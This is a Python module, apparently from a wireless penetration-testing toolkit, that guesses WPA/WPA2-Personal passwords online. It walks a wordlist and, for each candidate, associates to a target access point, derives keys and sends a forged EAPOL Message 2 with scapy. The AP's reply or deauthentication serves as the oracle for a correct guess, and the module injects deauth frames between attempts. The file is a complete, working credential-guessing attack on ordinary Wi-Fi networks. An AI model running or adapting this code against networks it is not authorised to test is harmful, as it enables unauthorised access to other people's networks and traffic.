"""Online WPA/WPA2-Personal password guessing: one live 4-way handshake
per candidate password, budgeted and slow by design.

For each candidate: associate to the AP, wait for its EAPOL-Key Message 1
(ANonce), derive PMK/PTK from the candidate password, and send a real
Message 2. The AP itself is the oracle -- if the candidate is correct,
its own MIC check on our M2 passes and it replies with Message 3; if
wrong, it silently drops M2 (no reply) or deauthenticates us. Nothing is
guessed offline here -- this is the live-handshake equivalent of what a
captured-handshake dictionary crack does after the fact, traded for
being usable when no handshake could be captured at all (PMF blocking
deauth, no client ever associating, etc.) -- see OmniOrchestrator's
ONLINE stage, the reason this module exists.

WPA3-only (SAE) targets cannot be attacked this way: SAE's Dragonfly key
exchange has no PSK-and-nonces equivalent for a candidate password to be
tested against. Only 'WPA'/'WPA2'/'transition' (PSK AKM present) targets
are supported -- callers must check ap.security before calling this;
this module does not re-derive it from a live scan itself.

TKIP is out of scope -- CCMP/AES (Key Descriptor Version 2, HMAC-SHA1
MIC) only, which covers the overwhelming majority of real WPA2-Personal
deployments. See wpa/crypto.py for the key-derivation math itself.

One attempt = one full association + 4-way handshake round trip
(~1-3s in practice against a real AP) -- this is meant as a budgeted
last resort, not a wordlist-exhausting brute force.
"""

from __future__ import annotations

import os
import time
from dataclasses import dataclass
from functools import partial

from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoResp,
    Dot11Auth,
    Dot11Deauth,
    Dot11Disas,
    RadioTap,
)
from scapy.layers.eap import EAPOL, EAPOL_KEY
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Packet
from scapy.sendrecv import AsyncSniffer, sendp

from ..frames import assoc_resp_status, craft_assoc_req, craft_auth, craft_rsn_ie
from ..radio import ensure_channel
from ..wpa.crypto import compute_mic, derive_pmk, derive_ptk, mac_to_bytes, split_ptk

CCMP_KEY_DESCRIPTOR_VERSION = 2
RSN_DESCRIPTOR_TYPE = 2


def _inject_radiotap() -> RadioTap:
    """RadioTap header for frames we inject over the air -- ORDER only,
    same reasoning as frames.py's own _inject_radiotap() (not imported
    across the module boundary, matching wps/eap.py's precedent)."""
    return RadioTap(present="TXFlags", TXFlags="ORDER")


@dataclass
class OnlineGuessResult:
    success: bool
    password: str | None = None
    attempts: int = 0
    skipped_invalid: int = 0
    detail: str = ""


def _craft_client_deauth(bssid: str, client: str, reason: int = 3) -> Packet:
    """Deauth sent BY the client TO the AP (opposite direction/roles from
    frames.craft_deauth, which is AP-to-client) -- used to force a clean
    association state between guess attempts."""
    dot11 = Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid)
    return _inject_radiotap() / dot11 / Dot11Deauth(reason=reason)


def _sniff_wait(sniffer, found: list, timeout: float, stop_event) -> None:
    """Join the sniffer in short slices so a set stop_event aborts the
    wait within ~0.2s instead of only when the full timeout expires --
    this is what makes the GUI's Stop Attack button a real stop for an
    online-guess attempt blocked in one of these waits (a single
    sniffer.join(timeout) would otherwise sit out the whole timeout)."""
    deadline = time.monotonic() + timeout
    while not found:
        if stop_event is not None and stop_event.is_set():
            return
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return
        sniffer.join(timeout=min(0.2, remaining))


def _wait_for_dot11(iface: str, bssid: str, layer, timeout: float, send_fn=None, stop_event=None):
    """Sniff for the next frame of `layer` genuinely sourced from bssid."""
    bssid_lower = bssid.lower()
    found = []

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if pkt.haslayer(layer):
            found.append(pkt)

    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
    sniffer.start()
    try:
        if send_fn is not None:
            time.sleep(0.05)
            send_fn()
        _sniff_wait(sniffer, found, timeout, stop_event)
    finally:
        try:
            sniffer.stop()
        except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
            pass
    return found[0] if found else None


def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float, stop_event=None) -> tuple[bool, str]:
    """Open-system auth + real WPA-PSK association (RSN IE, not the WPS
    vendor IE attacks/wps.py uses). Returns (ok, detail)."""
    auth_resp = _wait_for_dot11(
        iface, bssid, Dot11Auth, timeout, stop_event=stop_event,
        send_fn=lambda: sendp(craft_auth(bssid, client), iface=iface, verbose=False),
    )
    if auth_resp is None:
        return False, "no auth response"
    status = auth_resp.getlayer(Dot11Auth).status
    if status != 0:
        return False, f"auth rejected, status={status}"

    rsn_ie = craft_rsn_ie(akms=[2])  # PSK
    assoc_resp = _wait_for_dot11(
        iface, bssid, Dot11AssoResp, timeout, stop_event=stop_event,
        send_fn=lambda: sendp(craft_assoc_req(bssid, client, ssid=ssid, extra_ies=[rsn_ie]), iface=iface, verbose=False),
    )
    if assoc_resp is None:
        return False, "no assoc response"
    status = assoc_resp_status(assoc_resp)
    if status != 0:
        return False, f"assoc rejected, status={status}"
    return True, "associated"


def _wait_for_m1(iface: str, bssid: str, timeout: float, stop_event=None):
    """Sniff for the AP's EAPOL-Key Message 1 (ack set, mic not set)."""
    bssid_lower = bssid.lower()
    found = []

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        key = pkt.getlayer(EAPOL_KEY)
        if key is None:
            return
        if key.key_ack and not key.has_key_mic:
            found.append(pkt)

    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
    sniffer.start()
    _sniff_wait(sniffer, found, timeout, stop_event)
    try:
        sniffer.stop()
    except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
        pass
    return found[0] if found else None


def _wait_for_m3_or_reject(iface: str, bssid: str, timeout: float, send_fn, stop_event=None):
    """Wait for either an EAPOL-Key Message 3 (mic+ack+install -- success)
    or an explicit Deauth/Disassoc (unambiguous wrong-password signal).
    Returns ('m3', pkt) | ('rejected', pkt) | (None, None) on timeout."""
    bssid_lower = bssid.lower()
    found: list[tuple[str, object]] = []

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
            found.append(("rejected", pkt))
            return
        key = pkt.getlayer(EAPOL_KEY)
        if key is not None and key.key_ack and key.has_key_mic:
            found.append(("m3", pkt))

    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
    sniffer.start()
    try:
        time.sleep(0.05)
        send_fn()
        _sniff_wait(sniffer, found, timeout, stop_event)
    finally:
        try:
            sniffer.stop()
        except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
            pass
    if not found:
        return None, None
    return found[0]


def _build_m2(bssid: str, client: str, replay_counter: int, descriptor_version: int, snonce: bytes, kck: bytes, rsn_ie_bytes: bytes) -> Packet:
    """Build a real EAPOL-Key Message 2 (SNonce + station's RSNE + MIC),
    wrapped in the full 802.11 Data/LLC/SNAP stack (station -> AP, ToDS).

    The wrap is load-bearing, not cosmetic: this packet is sendp()'d onto
    a monitor-mode AF_PACKET socket, where the kernel/driver expects the
    bytes to begin with an 802.11 MAC header. A bare EAPOL frame (this
    function's original return value) gets misparsed as one and never
    transmits -- invisible to the unit tests, which inject try_fn and
    never touch the wire."""
    key = EAPOL_KEY(
        key_descriptor_type=RSN_DESCRIPTOR_TYPE,
        key_type=1,  # Pairwise
        key_descriptor_type_version=descriptor_version,
        has_key_mic=1,
        key_ack=0,
        install=0,
        secure=0,
        key_length=0,
        key_replay_counter=replay_counter,
        key_nonce=snonce,
        key_mic=b"\x00" * 16,
        key_data=rsn_ie_bytes,
    )
    eapol = EAPOL(version=1, type=3) / key
    unsigned = bytes(eapol)
    mic = compute_mic(kck, unsigned)
    key.key_mic = mic
    dot11 = Dot11(type=2, subtype=0, FCfield="to_DS", addr1=bssid, addr2=client, addr3=bssid)
    return (
        _inject_radiotap()
        / dot11
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
        / SNAP(OUI=0, code=0x888E)
        / EAPOL(version=1, type=3)
        / key
    )


def _try_password(
    iface: str, bssid: str, client: str, ssid: str, password: str, msg_timeout: float,
    stop_event=None,
) -> tuple[bool, str]:
    """One full live attempt: associate, 4-way handshake with `password`
    as the candidate PSK. Returns (success, detail). A set stop_event
    aborts whichever phase is in progress within ~0.2s (see _sniff_wait)
    instead of sitting out each sniffer's full timeout."""
    ok, detail = _associate(iface, bssid, client, ssid, msg_timeout, stop_event=stop_event)
    if not ok:
        return False, f"assoc: {detail}"
    if stop_event is not None and stop_event.is_set():
        sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
        return False, "stopped"

    m1 = _wait_for_m1(iface, bssid, msg_timeout, stop_event=stop_event)
    if m1 is None:
        sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
        return False, "no Message 1 from AP after association"

    key1 = m1.getlayer(EAPOL_KEY)
    anonce = bytes(key1.key_nonce)
    replay_counter = key1.key_replay_counter
    descriptor_version = key1.key_descriptor_type_version or CCMP_KEY_DESCRIPTOR_VERSION

    try:
        pmk = derive_pmk(password, ssid)
    except ValueError as exc:
        sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
        return False, f"invalid passphrase: {exc}"

    snonce = os.urandom(32)
    aa, spa = mac_to_bytes(bssid), mac_to_bytes(client)
    ptk = derive_ptk(pmk, aa, spa, anonce, snonce)
    kck, _kek, _tk = split_ptk(ptk)

    rsn_ie_bytes = bytes(craft_rsn_ie(akms=[2]))
    outcome, _pkt = _wait_for_m3_or_reject(
        iface, bssid, msg_timeout,
        send_fn=lambda: sendp(
            _build_m2(bssid, client, replay_counter, descriptor_version, snonce, kck, rsn_ie_bytes),
            iface=iface, verbose=False,
        ),
        stop_event=stop_event,
    )
    sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)

    if outcome == "m3":
        return True, "AP confirmed Message 3 -- password verified live"
    if outcome == "rejected":
        return False, "AP deauthenticated/disassociated after Message 2 -- wrong password"
    return False, "no Message 3 within timeout -- likely wrong password"


def online_guess(
    iface: str,
    bssid: str,
    ssid: str,
    client: str,
    wordlist: str,
    channel: int | None = None,
    msg_timeout: float = 5.0,
    max_attempts: int | None = None,
    max_consecutive_assoc_failures: int = 3,
    stop_event=None,
    progress_fn=None,
    try_fn=None,
) -> OnlineGuessResult:
    """Walk `wordlist` (one candidate per line), trying each as a live PSK
    against bssid/ssid. Stops at the first AP-confirmed success, the
    stop_event, max_attempts, or the wordlist running out.

    Aborts early after `max_consecutive_assoc_failures` explicit 802.11
    auth/assoc rejections in a row -- a strong signal the AP is
    excluding/blacklisting this client, not a per-password result worth
    continuing to burn attempts against.

    `try_fn` is dependency-injected (defaults to the real _try_password
    with stop_event bound in, so the GUI's Stop Attack aborts an attempt
    mid-handshake, not just between attempts) so the wordlist/budget/
    stop-event orchestration here can be unit tested without touching
    hardware, matching this project's existing pattern (see e.g. omni.py's
    own docstring, wps_pin_bruteforce's attempt_fn)."""
    def log(msg: str) -> None:
        if progress_fn is not None:
            progress_fn(msg)

    if try_fn is None:
        try_fn = partial(_try_password, stop_event=stop_event)

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    result = OnlineGuessResult(success=False)
    consecutive_assoc_failures = 0

    with open(wordlist, encoding="utf-8", errors="replace") as f:
        for line in f:
            if stop_event is not None and stop_event.is_set():
                result.detail = "stopped"
                return result
            if max_attempts is not None and result.attempts >= max_attempts:
                result.detail = f"reached max_attempts ({max_attempts})"
                return result

            password = line.strip()
            if not password:
                continue
            if not 8 <= len(password) <= 63:
                result.skipped_invalid += 1
                continue

            result.attempts += 1
            log(f"[{result.attempts}] trying {password!r} against {bssid}")
            success, detail = try_fn(iface, bssid, client, ssid, password, msg_timeout)
            log(f"[{result.attempts}] {password!r}: {detail}")

            if success:
                result.success = True
                result.password = password
                result.detail = detail
                return result

            if detail.startswith("assoc:"):
                consecutive_assoc_failures += 1
                if consecutive_assoc_failures >= max_consecutive_assoc_failures:
                    result.detail = (
                        f"aborted after {consecutive_assoc_failures} consecutive auth/assoc "
                        "rejections -- AP likely excluding this client"
                    )
                    return result
            else:
                consecutive_assoc_failures = 0

    result.detail = f"wordlist exhausted after {result.attempts} attempt(s)"
    return result
